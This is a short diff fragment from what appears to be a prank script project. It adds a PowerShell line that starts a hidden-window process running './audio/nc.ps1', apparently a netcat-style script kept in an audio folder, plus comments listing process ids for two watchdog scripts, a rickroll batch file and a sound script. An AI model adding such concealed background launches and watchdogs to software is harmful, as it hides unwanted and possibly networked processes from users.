@@ -1,0 +1,6 @@
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './audio/nc.ps1'"         # background process starting
+
+wd0pid        # watchdog0.ps1 process id
+wd1pid        # watchdog1.ps1 process id
+rrpid         # rickroll.bat process id
+spid          # sound.ps1 process id
